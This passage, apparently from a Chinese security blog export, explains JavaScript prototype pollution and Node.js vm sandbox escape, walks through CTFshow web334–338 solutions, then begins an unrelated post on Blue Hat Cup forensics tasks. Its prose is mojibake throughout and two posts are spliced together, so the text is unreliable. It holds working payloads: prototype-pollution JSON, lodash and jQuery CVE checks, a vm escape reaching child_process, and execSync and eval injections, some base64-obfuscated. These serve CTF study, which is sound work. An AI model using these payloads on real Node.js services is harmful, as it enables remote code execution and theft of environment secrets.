prototypeæ˜¯ç±»Fooçš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨Fooç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚æ¯”å¦‚ä¸Šé¢ä¸­çš„fooå¯¹è±¡ï¼Œå…¶å¤©ç”Ÿå°±å…·æœ‰foo.show()æ–¹æ³•ã€‚\n\nå¦‚ä¸Šé¢æ‰€è¯´, æˆ‘ä»¬å¯ä»¥é€šè¿‡Foo.prototypeæ¥è®¿é—®Fooç±»çš„åŸå‹, ä½†Fooå®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡, æ˜¯ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹çš„, è¿™æ—¶å€™å°±è¯¥__proto__ç™»åœºäº†\nä¸åŒäºprototypeæ˜¯å‡½æ•°ç‰¹æœ‰çš„, å®ƒæ˜¯å¯¹è±¡æ‰€ç‹¬æœ‰çš„, protoå±æ€§éƒ½æ˜¯ç”±ä¸€ä¸ªå¯¹è±¡æŒ‡å‘ä¸€ä¸ªå¯¹è±¡, å³æŒ‡å‘å®ƒä»¬çš„åŸå‹å¯¹è±¡(ä¹Ÿå¯ä»¥ç†è§£ä¸ºçˆ¶å¯¹è±¡)\n\nä¸€ä¸ªFooç±»å®ä¾‹åŒ–å‡ºæ¥çš„Fooå¯¹è±¡, å¯ä»¥é€šè¿‡foo.__proto__å±æ€§æ¥è®¿é—®Fooç±»çš„åŸå‹, ä¹Ÿå°±æ˜¯è¯´: foo.__proto__===Foo.prototype(True)\nå³: prototypeæ˜¯ä¸€ä¸ªç±»çš„å±æ€§, æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰prototypeä¸­çš„å±æ€§å’Œæ–¹æ³•. ä¸€ä¸ªå¯¹è±¡çš„__proto__å±æ€§, æŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨ç±»çš„prototypeå±æ€§\n\nåŸå‹é“¾ç»§æ‰¿æ€æƒ³function Father() &#123;    this.first_name = &#x27;Donald&#x27;    this.last_name = &#x27;Trump&#x27;&#125;function Son() &#123;    this.first_name = &#x27;Melania&#x27;&#125;Son.prototype = new Father()let son = new Son()console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)console.log(son.__proto__)console.log(son.__proto__.__proto__)console.log(son.__proto__.__proto__.__proto__)\n\n\nSonç±»ç»§æ‰¿äº†Fatherç±»çš„last_nameå±æ€§, æœ€åè¾“å‡ºçš„æ˜¯Name: Melania Trump\n\næ€»ç»“: å¯¹äºå¯¹è±¡son, åœ¨console.log()è°ƒç”¨son.last_nameçš„æ—¶å€™, å®é™…ä¸ŠJavaScriptå¼•æ“ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œ:\n\nåœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last_name\nå¦‚æœæ‰¾ä¸åˆ°, åˆ™åœ¨son.__proto__ä¸­å¯»æ‰¾last_name\nå¦‚æœä»ç„¶æ‰¾ä¸åˆ°, åˆ™ç»§ç»­åœ¨son.__proto__.__proto__ä¸­å¯»æ‰¾last_name\nä¾æ¬¡å¯»æ‰¾, ç›´åˆ°æ‰¾åˆ°nullç»“æŸ, æ¯”å¦‚, Object.prototypeçš„__proto__å°±æ˜¯null\n\n\nç±»ä¼¼äºJavaé‡Œé¢ç»§æ‰¿çš„æ€æƒ³, å¦‚æœå­ç±»æ²¡æœ‰è¿™ä¸ªå±æ€§, å¾€ä¸Šç»§æ‰¿çˆ¶ç±», æœ‰çš„è¯å°±è‡ªå·±ç”¨è‡ªå·±çš„å¤šæ€\nJavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾æœºåˆ¶, è¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­, è¢«ç§°ä½œprototypeç»§æ‰¿é“¾\n\næ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡\nå¯¹è±¡çš„__proto__å±æ€§, æŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡prototype\nJavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶\n\nåŸå‹é“¾å®šä¹‰åŠå¦‚ä½•æ±¡æŸ“åŸå‹é“¾çš„æ ¸å¿ƒå°±æ˜¯ä¾èµ–å¯¹è±¡__proto__çš„æŒ‡å‘, å½“è®¿é—®çš„å±æ€§åœ¨è¯¥å¯¹è±¡ä¸å­˜åœ¨æ—¶, å°±ä¼šå‘ä¸Šä»è¯¥å¯¹è±¡æ„é€ å‡½æ•°çš„prototypeè¿›è¡ŒæŸ¥æ‰¾, ç›´è‡³æŸ¥æ‰¾åˆ°objectçš„åŸå‹nullä¸ºæ­¢\n\nç”±äºå¯¹è±¡ä¹‹å‰å­˜åœ¨ç»§æ‰¿å…³ç³», æ‰€ä»¥å½“æˆ‘ä»¬è¦ä½¿ç”¨æˆ–è€…è¾“å‡ºä¸€ä¸ªå˜é‡å°±ä¼šé€šè¿‡åŸå‹é“¾å‘ä¸Šæœç´¢, å½“ä¸Šå±‚æ²¡æœ‰å°±ä¼šå†å‘ä¸Šä¸Šå±‚æœç´¢, ç›´åˆ°æŒ‡å‘null, è‹¥æ­¤æ—¶è¿˜ä¸ºæ‰¾åˆ°å°±ä¼šè¿”å›underfined\nå›¾ä¸­åŸå‹é“¾æ˜¯cat-&gt;Cat.prototype-&gt;Object.prototype-&gt;null\n\nåŸå‹é“¾æ±¡æŸ“å°±æ˜¯ä¿®æ”¹å…¶æ„é€ å‡½æ•°ä¸­çš„å±æ€§å€¼, ä½¿å…¶ä»–é€šè¿‡è¯¥æ„é€ å‡½æ•°å®ä¾‹åŒ–å‡ºçš„å¯¹è±¡ä¹Ÿå…·æœ‰è¿™ä¸ªå±æ€§çš„å€¼\\\nç”±äºå¯¹è±¡æ˜¯æ— åºçš„, å½“ä½¿ç”¨ç¬¬äºŒç§æ–¹å¼è®¿é—®å¯¹è±¡æ—¶, åªèƒ½ä½¿ç”¨æŒ‡æ˜ä¸‹æ ‡çš„æ–¹å¼å»è®¿é—®\nä¸‹é¢æˆ‘ä»¬çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­\n//fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡let foo = &#123;bar:1&#125;//foo.bar æ­¤æ—¶ä¸º1console.log(foo.bar)//ä¿®æ”¹fooçš„åŸå‹ (å³Object)foo.__proto__.bar = 2//ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› , foo.barä»ç„¶æ˜¯1console.log(foo.bar)console.log(foo.__proto__)// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡let zoo = &#123;&#125;// æŸ¥çœ‹zoo.barconsole.log(zoo.bar)\n\n\né¦–å…ˆå»ºç«‹ä¸€ä¸ªfooå¯¹è±¡, æœ‰ä¸€ä¸ªbarå±æ€§ä¸º1, æ­¤æ—¶å®ƒçš„åŸå‹å¯¹è±¡å¹¶æ²¡æœ‰, åé¢é€šè¿‡foo.__proto__æŒ‡å‘å®ƒçš„åŸå‹å¯¹è±¡, ä¹Ÿå°±æ˜¯ç­‰ä»·äºæ˜¯foo.prototype, å³Object, ç»™ObjectåŸå‹å¯¹è±¡å¢åŠ äº†barå±æ€§, å€¼ä¸º2, ç°åœ¨Objectæœ‰äº†ä¸€ä¸ªbar=2çš„prototypeåŸå‹å¯¹è±¡, æ˜¯ç©ºçš„\nä½†æ˜¯åœ¨æˆ‘ä»¬è¾“å‡ºzoo.barçš„æ—¶å€™, Node.jsçš„å¼•æ“å°±å¼€å§‹åœ¨zooä¸­æŸ¥æ‰¾, å‘ç°æ²¡æœ‰, å»zoo.__proto__ä¸­æŸ¥æ‰¾, å³åœ¨Objectä¸­æŸ¥æ‰¾, è€Œæˆ‘ä»¬çš„foo.prototype.bar=2, å°±æ˜¯ç»™Objectæ·»åŠ äº†ä¸€ä¸ªbarå±æ€§, è€Œè¿™ä¸ªå±æ€§è¢«zooç»§æ‰¿\nè¿™ç§ä¿®æ”¹äº†ä¸€ä¸ªæŸä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼Œä»è€Œæ§åˆ¶åˆ«çš„å¯¹è±¡çš„æ“ä½œï¼Œå°±æ˜¯åŸå‹é“¾æ±¡æŸ“\nåŸå‹é“¾æ±¡æŸ“é…åˆRCEæœ‰åŸå‹é“¾æ±¡æŸ“çš„å‰æä¸‹, æˆ‘ä»¬å¯ä»¥æ§åˆ¶åŸºç±»çš„æˆå‘˜, èµ‹å€¼ä¸ºä¸€ä¸²æ¶æ„ä»£ç , ä»è€Œå¯¼è‡´ä»£ç æ³¨å…¥\n//fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡let foo = &#123;bar:1&#125;//foo.bar æ­¤æ—¶ä¸º1console.log(foo.bar)//ä¿®æ”¹fooçš„åŸå‹ (å³Object)foo.__proto__.bar = require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;);//ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› , foo.barä»ç„¶æ˜¯1console.log(foo.bar)// console.log(foo.__proto__)// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡let zoo = &#123;&#125;// æŸ¥çœ‹zoo.barconsole.log(zoo.bar)\n\n\nvmæ²™ç®±é€ƒé€¸mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“å…¶å®æ‰¾æ‰¾èƒ½å¤Ÿæ§åˆ¶æ•°ç»„(å¯¹è±¡)çš„â€é”®åâ€çš„æ“ä½œå³å¯è®¾ç½®__proto__çš„å€¼\n\nå¯¹è±¡merge\nå¯¹è±¡clone (å…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­)\n\nmergeæ“ä½œæ—¶æœ€å¸¸è§çš„å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œ, ä¹Ÿæœ€å¯èƒ½è¢«åŸå‹é“¾æ”»å‡» \nä»¥å¯¹è±¡mergeä¸ºä¾‹, æˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°:\nfunction merge(target, source) &#123;    for (let key in source)&#123;        if (key in source&amp;&amp; key in target)&#123;            merge(target[key], source[key])                    &#125;else &#123;            target[key] = source[key]        &#125;    &#125;&#125;\n\nåœ¨åˆå¹¶è¿‡ç¨‹ä¸­, å­˜åœ¨èµ‹å€¼çš„æ“ä½œtarget[key] = source[key], é‚£ä¹ˆ, è¿™ä¸ªkeyå¦‚æœæ˜¯__proto__(jsonæ ¼å¼æ‰å¯ä»¥è¢«å½“æˆkey), æ˜¯ä¸æ˜¯å°±å¯ä»¥åŸå‹æ±¡æŸ“\nfunction merge(target, source) &#123;    for (let key in source)&#123;        if (key in source&amp;&amp; key in target)&#123;            merge(target[key], source[key])        &#125;else &#123;            target[key] = source[key]        &#125;    &#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#x27;&#123;&quot;a&quot;:1, &quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#x27;)merge(object1, object2)console.log(object1.a , object1.b)object3 = &#123;&#125;console.log(object3.b)\n\néœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼š\nåœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ__proto__ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚\nejsæ±¡æŸ“å‚è€ƒ: Express+lodash+ejs: ä»åŸå‹é“¾æ±¡æŸ“åˆ°RCE - evi0sâ€™ Blog\nlodashæ±¡æŸ“å‚è€ƒ: CVE-2019-10744\nloadash.defaultsDeep(obj.JSON.parse(objstr));\n\nåªéœ€è¦æœ‰objsträ¸º\n&#123;&quot;content&quot;:&#123;&quot;prototype&quot;:&#123;&quot;constructor&quot;:&#123;&quot;a&quot;:&quot;b&quot;&#125;&#125;&#125;&#125;\n\nåœ¨åˆå¹¶æ—¶ä¾¿ä¼šåœ¨Objectä¸Šé™„åŠ a=bè¿™æ ·ä¸€ä¸ªå±æ€§\nlodashæ˜¯ä¸€ä¸ªéå¸¸æµè¡Œçš„JavaScriptå·¥å…·åº“\nconst mergeFn = require(&#x27;lodash&#x27;).defaultsDeep;const payload = &#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;a0&quot;: true&#125;&#125;&#125;&#x27; function check() &#123;    mergeFn(&#123;&#125;, JSON.parse(payload));    if ((&#123;&#125;)[`a0`] === true) &#123;        console.log(`Vulnerable to Prototype Pollution via $&#123;payload&#125;`);    &#125;  &#125; check();\n\nè¿è¡Œä¸Šé¢çš„jsè¯­å¥ï¼Œå°±å¯ä»¥æ£€æŸ¥è¿™ä¸ªç‰ˆæœ¬çš„lodashæ˜¯å¦å­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚\nå…¶ä¸­æ¼æ´å…³é”®è§¦å‘ç‚¹åœ¨defaultsDeepå‡½æ•°ï¼Œå®ƒå°†(&#123;&#125;, JSON.parse(payload))mergeæ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´åŸå‹é“¾æ±¡æŸ“ã€‚ä½¿ç”¨JSON.parseå°±æ˜¯ä¿è¯åˆå¹¶æ—¶èƒ½ä»¥å­—å…¸è§£æï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²\nJQueryæ±¡æŸ“å‚è€ƒ: CVE-2019-11358\nç‰ˆæœ¬å°äº3.4.0æ—¶ JQueryå­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´\n$.extend(true,&#123;&#125;,JSON.parse(&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;aa&quot;:&quot;hello&quot;&#125;&#125;&#x27;))&#123;aa: &#x27;hello&#x27;&#125;var b = 1.2;undefinedb.aa;&#x27;hello&#x27;\n\n\nJqueryå¯ä»¥ç”¨$.extendå°†ä¸¤ä¸ªå­—å…¸mergeï¼Œè€Œè¿™ä¹Ÿå› æ­¤æ±¡æŸ“äº†åŸå‹é“¾ã€‚\nvmæ²™ç®±é€ƒé€¸å‚è€ƒ: mongo-express RCE(CVE-2019-10758)\nvmæ˜¯ç”¨æ¥å®ç°ä¸€ä¸ªæ²™ç®±ç¯å¢ƒï¼Œå¯ä»¥å®‰å…¨çš„æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç è€Œä¸ä¼šå½±å“åˆ°ä¸»ç¨‹åºã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æ„é€ è¯­å¥æ¥è¿›è¡Œé€ƒé€¸\nä¾‹å­\nconst vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`this.constructor.constructor(&#x27;return this.process.env&#x27;)()`);console.log(env);\n\næ‰§è¡Œä¹‹åå¯ä»¥è·å–ä¸»ç¨‹åºç¯å¢ƒä¸­çš„ç¯å¢ƒå˜é‡\nä¸Šé¢ä»£ç ç­‰ä»·äºä¸‹é¢ä»£ç \nconst vm = require(&#x27;vm&#x27;);const sandbox = &#123;&#125;;const script = new vm.Script(&quot;this.constructor.constructor(&#x27;return this.process.env&#x27;)()&quot;);const context = vm.createContext(sandbox);env = script.runInContext(context);console.log(env);\n\nåˆ›å»ºvmç¯å¢ƒæ—¶, é¦–å…ˆè¦åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡sandbox, è¿™ä¸ªå¯¹è±¡å°±æ˜¯vmä¸­è„šæœ¬æ‰§è¡Œæ—¶çš„å…¨å±€ç¯å¢ƒcontext, vmè„šæœ¬ä¸­å…¨å±€thisæŒ‡å‘çš„å°±æ˜¯è¿™ä¸ªå¯¹è±¡\nå› ä¸ºthis.constructor.constructorè¿”å›çš„æ˜¯ä¸€ä¸ªFunction constructor, æ‰€ä»¥å¯ä»¥åˆ©ç”¨functionå¯¹è±¡æ„é€ ä¸€ä¸ªå‡½æ•°å¹¶æ‰§è¡Œ. (æ­¤æ—¶functionå¯¹è±¡çš„ä¸Šä¸‹æ–‡ç¯å¢ƒå°±æ˜¯å¤„äºä¸»ç¨‹åºä¸­çš„)è¿™é‡Œæ„é€ å‡½æ•°å†…çš„è¯­å¥æ˜¯return this.process.env, ç»“æœæ˜¯è¿”å›äº†ä¸»ç¨‹åºçš„ç¯å¢ƒå˜é‡\né…åˆchile_process.exec()å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†:\nconst vm = require(&#x27;vm&#x27;);const env = vm.runInNewContext(`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString()`);console.log(env);\n\n\nåšå‡ ä¸ªé¢˜(CTFshow)web334ç”±å‰ç½®çŸ¥è¯†å¯çŸ¥\n\nåœ¨Character.toUpperCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä±ä¼šè½¬å˜ä¸ºIï¼Œå­—ç¬¦Å¿ä¼šå˜ä¸ºSã€‚åœ¨Character.toLowerCase()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä°ä¼šè½¬å˜ä¸ºiï¼Œå­—ç¬¦â„ªä¼šè½¬å˜ä¸ºkã€‚\n\næ‰€ä»¥ç”¨ctfÅ¿how 123456ç™»å½•å°±å¯ä»¥å‡ºflagäº†\nä½†æ˜¯è¿™é¢˜å…¶å®ç›´æ¥ç”¨å°å†™çš„ctshowå°±å¯ä»¥ç»•è¿‡\nweb335çœ‹è§æç¤º\nçŒœæµ‹åç«¯ä¸ºeval()ä»£ç æ‰§è¡Œ\nå°è¯•ä¸€ä¸‹rce\nrequire(&#x27;child_process&#x27;).execSync(&#x27;tac f*&#x27;).toString()\n\n\nä¹Ÿå¯ä»¥å€Ÿé‰´yuå¸ˆå‚…çš„\nrequire( &#x27;child_process&#x27; ).spawnSync( &#x27;tac&#x27;, [ &#x27;fl00g.txt&#x27; ] ).stdout.toString()\n\næˆ–è€…ä½¿ç”¨fsè¯»æ–‡ä»¶\n?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)  //æŸ¥çœ‹å½“å‰ç›®å½•?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl00g.txt&#x27;) //è¯»å–æ–‡ä»¶\n\nweb336è¿‡æ»¤äº†execSync\nå¯ä»¥ä½¿ç”¨ä¸Šé¢è¯´çš„spawnSyncæˆ–è€…fs\nä¹Ÿå¯ä»¥ä½¿ç”¨æ‹¼æ¥ç»•è¿‡/ç¼–ç ç»•è¿‡ç­‰ç­‰\nè¿™é‡Œç®€å•å†™å‡ ä¸ªpayload, å…¶å®æ˜¯ä¸Šé¢RCE_ByPasså·²ç»æåˆ°è¿‡çš„\nrequire(&#x27;child_process&#x27;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;ls&quot;).toString() //æ‹¼æ¥ç»•è¿‡require(&quot;child_process&quot;)[&quot;\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63&quot;](&#x27;calc&#x27;).toString() //ç¼–ç ç»•è¿‡require(&quot;child_process&quot;)[&quot;\\u0065\\u0078\\u0065\\u0063\\u0053\\x79\\x6e\\x63&quot;](&#x27;calc&#x27;).toString()eval(Buffer.from(&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCd0YWMgZionKTs=&#x27;,&#x27;base64&#x27;).toString());\n\n\nweb337var express = require(&#x27;express&#x27;);var router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123;  return crypto.createHash(&#x27;md5&#x27;)    .update(s)    .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;xxxxxxx&#x27;;  var a = req.query.a;  var b = req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;  \tres.end(flag);  &#125;else&#123;  \tres.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;);  &#125;  &#125;);module.exports = router;\n\nmd5ç»•è¿‡ like php\na[x]=1&amp;b[x]=2b[]=1&amp;a[]=1\n\n\n\nweb338 é‡ç‚¹åœ¨äºlogin.js\nvar express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page.  */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var secert = &#123;&#125;;  var sess = req.session;  let user = &#123;&#125;;  utils.copy(user,req.body);  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;    res.end(flag);  &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#x27;ç™»å½•å¤±è´¥&#x27;+JSON.stringify(user)&#125;);    &#125;    &#125;);module.exports = router;\n\nå¯ä»¥çœ‹åˆ°flagå°±åœ¨è¿™é‡Œ, è¦æƒ³è·å¾—flag, å°±éœ€è¦ä½¿å¾—secert.ctfshow===&#39;36dboy&#39;, æˆ‘ä»¬å¯ä»¥å‘ç°è¿™é‡Œæœ‰ä¸ªutils.copy , å°±ç±»ä¼¼äºmergeå‡½æ•°, å­˜åœ¨åŸå‹æ±¡æŸ“\npayload:\n&#123;&quot;username&quot;:&quot;ctfhsow&quot;,&quot;password&quot;:&quot;ctfhsow&quot;,&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;\n\n\n","tags":["Web","Study","Node.js","JavaScript"]},{"title":"è“å¸½æ¯_ç”µå­å–è¯","url":"/2022/07/10/blue_hat/","content":"ç¬¬ä¸€æ¬¡åšè¿™ä¹ˆå¤šå–è¯é¢˜ï¼Œä¹Ÿæ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿\næ‰‹æœºå–è¯æ‰‹æœºå–è¯_1\n  â€‹    ç°å¯¹ä¸€ä¸ªè‹¹æœæ‰‹æœºè¿›è¡Œå–è¯ï¼Œè¯·æ‚¨å¯¹ä»¥ä¸‹é—®é¢˜è¿›è¡Œåˆ†æè§£ç­”ã€‚\n  â€‹    627604C2-C586-48C1-AA16-FF33C3022159.PNGå›¾ç‰‡çš„åˆ†è¾¨ç‡æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼š1920x1080ï¼‰\n  â€‹    é™„ä»¶ä¸‹è½½åœ°å€è§å¹³å°å…¬å‘Šï¼Œè§£å‹å¯†ç ä¸º0ba6b2c094cbb3a04681a135487a19cb\n\nç›˜å¤é˜…è¯»å™¨æ‰“å¼€ï¼Œæœç´¢ä¸€ä¸‹é¢˜ç›®ä¸­çš„å›¾ç‰‡ï¼Œå¾—åˆ°\n\næˆ‘ä»¬ä¿å­˜ä¸‹æ¥ï¼Œçœ‹ä¸€ä¸‹å±æ€§\nå¾—åˆ°åˆ†è¾¨ç‡\n\næ‰‹æœºå–è¯_2è¿˜æ˜¯ä¸Šé¢˜åšæ³•ï¼Œæˆ‘ä»¬æœä¸€ä¸‹å•å·\n\nè®¡ç®—æœºå–è¯è®¡ç®—æœºå–è¯_1\n  ç°å¯¹ä¸€ä¸ªwindowsè®¡ç®—æœºè¿›è¡Œå–è¯ï¼Œè¯·æ‚¨å¯¹ä»¥ä¸‹é—®é¢˜è¿›è¡Œåˆ†æè§£ç­”ã€‚\n  ä»å†…å­˜é•œåƒä¸­è·å¾—taqi7çš„å¼€æœºå¯†ç æ˜¯å¤šå°‘ï¼Ÿï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šabcABC123ï¼‰\n  é™„ä»¶ä¸‹è½½åœ°å€è§å¹³å°å…¬å‘Šï¼Œè§£å‹å¯†ç ä¸º93ce7ea39bdd7baa137f1e9b963b7ee5\n\nå†…å­˜å–è¯ï¼Œæ¥åˆ°å¼ºå¤§çš„vol\nè¯¦æƒ…è§æˆªå›¾\n\nå¾—åˆ°åï¼Œæˆ‘ä»¬è¿›è¡ŒMD5è§£å¯†\n\nè®¡ç®—æœºå–è¯_2\n  åˆ¶ä½œè¯¥å†…å­˜é•œåƒçš„è¿›ç¨‹Pidå·æ˜¯å¤šå°‘ï¼Ÿï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼š1024ï¼‰\n\nè¿™æ¬¡æˆ‘ä»¬æ‰“å¼€ç«çœ¼\n\nç„¶åæ‰¾åˆ°è¿›ç¨‹\n\nè®¡ç®—æœºå–è¯_3\n  bitlokceråˆ†åŒºæŸofficeæ–‡ä»¶ä¸­å­˜åœ¨çš„flagå€¼ä¸ºï¼Ÿï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šflag{abcABC123}ï¼‰\n\næ¥åˆ°å–è¯å¤§å¸ˆï¼Œç”¨å°å·¥å…·è§£æå‡ºå¯†é’¥\n\nç„¶åä¿å­˜ä¸‹æ¥\n\nè§£å¼€ï¼Œå¾—åˆ°ä¸¤ä¸ªofficeæ–‡ä»¶ï¼Œå…¨éƒ¨å¯¼å‡º\n\nå†æ¬¡å¥—å¨ƒä¸€å±‚\n\næˆ‘ä»¬è¿˜èƒ½å‘ç°pass.txt,æ‰“å¼€æ˜¯ä¸ªå­—å…¸ï¼Œæ­£å¥½å¯ä»¥çˆ†ç ´\n\n\nè®¡ç®—æœºå–è¯_4\n  TrueCryptåŠ å¯†ä¸­å­˜åœ¨çš„flagå€¼ä¸ºï¼Ÿï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šflag{abcABC123}ï¼‰\n\nå†å›åˆ°vol\n\nä¸‡ç‰©çš†å¯binwalk\n\næ‹¿åˆ°äº†ä¸€å¨å‹ç¼©åŒ…ï¼Œå¤§è‡´ç¿»äº†ç¿»ï¼Œåªæœ‰ä¸€ä¸ªå¸¦å¯†ç çš„ï¼Œå¥½åƒæœ‰äº›ä¸œè¥¿\n\nå¥½åƒæŸåäº†ï¼Œç”±äºæ‰‹å¤´åªæœ‰ä¿®zipçš„å·¥å…·ï¼Œç”Ÿæ”¹åç¼€ï¼ŒæˆåŠŸï¼Œçˆ†ç ´\n\nflagï¼šflag&#123;1349934913913991394cacacacacacc&#125;\nappå–è¯ç¨‹åºåˆ†æ_1\n  ç°å·²è·å–æŸä¸ªAPPç¨‹åºï¼Œè¯·æ‚¨å¯¹ä»¥ä¸‹é—®é¢˜è¿›è¡Œåˆ†æè§£ç­”ã€‚\n  æœ¬ç¨‹åºåŒ…åæ˜¯ï¼Ÿï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šabc.xx.deï¼‰\n  é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½\n\næ‰“å¼€æˆ‘ä»¬çš„é›·ç”µå·¥å…·ï¼Œæ˜¾è€Œæ˜“è§\n\nç¨‹åºåˆ†æ_2\n  æœ¬ç¨‹åºçš„å…¥å£æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šabc.xx.deï¼‰\n\nç»§ç»­çœ‹\n\nå¾—åˆ°minmtta.hemjcbm.ahibyws.MainActivity\nç¨‹åºåˆ†æ_3\n  æœ¬ç¨‹åºçš„æœåŠ¡å™¨åœ°å€çš„å¯†æ–‡æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šabcABC123ï¼‰\n\nåç¼–è¯‘ä¸€ä¸‹ï¼Œæ‹¿åˆ°æºç \n\naHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6\nç¨‹åºåˆ†æ_4\n  æœ¬ç¨‹åºå®ç°å®‰å…¨æ£€æµ‹çš„ç±»çš„åç§°æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šabcABC123ï¼‰\n\nç»§ç»­é¡ºä¸€ä¸‹æˆ‘ä»¬çš„æºç ï¼Œå®‰å…¨æ£€æµ‹ï¼Œå‘ç°äº†ç›¸å…³æºç \n\nç½‘ç«™å–è¯ç½‘ç«™å–è¯_1\n  æ®äº†è§£ï¼ŒæŸç½‘ä¸Šå•†åŸç³»ä¸€å›¢ä¼™æ—¥å¸¸èµ„é‡‘å¾€æ¥ç”¨ï¼Œä»2022å¹´4æœˆ1æ—¥èµ·ä½¿ç”¨è™šæ‹Ÿå¸GGå¸è¿›è¡Œäº¤æ˜“ï¼Œç°å·²è·å¾—è¯¥ç½‘ç«™çš„æºä»£ç ä»¥åŠéƒ¨åˆ†æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ï¼Œè¯·æ‚¨å¯¹ä»¥ä¸‹é—®é¢˜è¿›è¡Œåˆ†æè§£ç­”ã€‚\n  è¯·ä»ç½‘ç«™æºç ä¸­æ‰¾å‡ºæœ¨é©¬æ–‡ä»¶ï¼Œå¹¶æäº¤æœ¨é©¬è¿æ¥çš„å¯†ç 